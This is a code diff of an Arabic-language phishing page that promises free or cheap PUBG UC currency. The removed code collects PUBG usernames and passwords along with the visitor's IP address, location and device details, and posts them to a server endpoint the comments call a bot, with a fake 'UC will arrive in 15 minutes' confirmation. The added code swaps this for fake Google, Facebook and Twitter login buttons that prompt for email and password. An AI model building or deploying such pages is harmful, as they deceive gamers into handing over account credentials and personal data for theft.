@@ -62,10 +62,31 @@
             margin-top: 10px;
         }
 
-        .pubg-logo {
-            width: 50px;
-            height: 50px;
-            margin-bottom: 20px;
+        .social-login {
+            margin-top: 20px;
+        }
+
+        .social-login button {
+            background-color: #444;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 5px 0;
+        }
+
+        .social-login img {
+            margin-right: 10px;
+            width: 24px;
+            height: 24px;
+        }
+
+        .price-list {
+            margin-top: 20px;
+        }
+
+        .price-list button {
+            margin-top: 10px;
         }
 
         .notification {
@@ -90,108 +111,45 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/9/9d/PUBG_logo.svg" alt="PUBG Logo" class="pubg-logo">
-        <h1>شحن شدات ببجي 🎮🚀</h1>
-        <form id="increaseForm">
-            <input type="hidden" name="chatId" id="chatIdInput">
-            <input type="text" name="username" placeholder="يوزر الحساب او البريد الإلكتروني" required>
-            <input type="password" name="password" placeholder="كلمة المرور" required>
-            <select name="uc" required>
-                <option value="">اختر عدد الشدات</option>
-                <option value="60">شدات 60🔥</option>
-                <option value="300">شدات 300⭐</option>
-                <option value="600">شدات 600💥</option>
-                <option value="1500">شدات 1500🚀</option>
-            </select>
-            <button type="submit">شحن</button>
-        </form>
+        <h1>تسجيل الدخول عبر</h1>
+        <div class="social-login">
+            <button id="loginGoogle"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" alt="Google"> Google</button>
+            <button id="loginFacebook"><img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook"> Facebook</button>
+            <button id="loginTwitter"><img src="https://upload.wikimedia.org/wikipedia/en/6/60/Twitter_Logo_as_of_2021.svg" alt="Twitter"> Twitter</button>
+        </div>
+        
+        <div class="price-list">
+            <h1>أسعار الشدات</h1>
+            <button>مجاني - 0$</button>
+            <button>1500 - 2$</button>
+            <button>2000 - 3$</button>
+            <button>2500 - 4$</button>
+            <button>3000 - 5$</button>
+            <button>10000 - 10$</button>
+        </div>
+
         <div class="notification" id="notification">
             <p>تم تنفيذ طلبك! إذا كانت البيانات صحيحة، فسوف تصل الشدات في غضون 15 دقيقة.</p>
         </div>
     </div>
+
     <script>
-        const increaseForm = document.getElementById('increaseForm');
-        const chatIdInput = document.getElementById('chatIdInput');
+        const loginGoogle = document.getElementById('loginGoogle');
+        const loginFacebook = document.getElementById('loginFacebook');
+        const loginTwitter = document.getElementById('loginTwitter');
         const notification = document.getElementById('notification');
 
-        // استخراج معرف المحادثة من عنوان URL
-        const chatId = window.location.pathname.split('/').pop();
-        chatIdInput.value = chatId;
-
-        // دالة للحصول على معلومات IP والدولة
-        async function getIPInfo() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                return {
-                    ip: data.ip,
-                    country: data.country_name,
-                    city: data.city
-                };
-            } catch (error) {
-                console.error('Error fetching IP info:', error);
-                return {
-                    ip: 'Unknown',
-                    country: 'Unknown',
-                    city: 'Unknown'
-                };
+        function showLoginDialog(platform) {
+            const email = prompt(`أدخل البريد الإلكتروني لحساب ${platform}`);
+            const password = prompt(`أدخل كلمة المرور لحساب ${platform}`);
+            if (email && password) {
+                alert(`تم تسجيل الدخول عبر ${platform}`);
             }
         }
 
-        // دالة للحصول على معلومات المنصة
-        function getPlatformInfo() {
-            const ua = navigator.userAgent;
-            let platform = "Unknown";
-            if (/Windows/.test(ua)) platform = "Windows";
-            else if (/Mac/.test(ua)) platform = "MacOS";
-            else if (/Linux/.test(ua)) platform = "Linux";
-            else if (/Android/.test(ua)) platform = "Android";
-            else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
-
-            return {
-                platform: platform,
-                userAgent: ua
-            };
-        }
-
-        increaseForm.addEventListener('submit', async (event) => {
-            event.preventDefault();
-            const formData = new FormData(increaseForm);
-            const data = Object.fromEntries(formData.entries());
-
-            // إضافة معلومات IP والدولة والمنصة
-            const ipInfo = await getIPInfo();
-            const platformInfo = getPlatformInfo();
-
-            Object.assign(data, ipInfo, platformInfo);
-
-            // إرسال البيانات إلى البوت
-            fetch('/submitIncrease', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    // عرض الإشعار
-                    notification.classList.add('show');
-                    setTimeout(() => {
-                        notification.classList.remove('show');
-                    }, 5000); // إخفاء الإشعار بعد 5 ثوان
-                    // إعادة عرض لوحة التسجيل
-                    increaseForm.reset();
-                } else {
-                    alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
-            });
-        });
+        loginGoogle.addEventListener('click', () => showLoginDialog('Google'));
+        loginFacebook.addEventListener('click', () => showLoginDialog('Facebook'));
+        loginTwitter.addEventListener('click', () => showLoginDialog('Twitter'));
     </script>
 </body>
 </html>
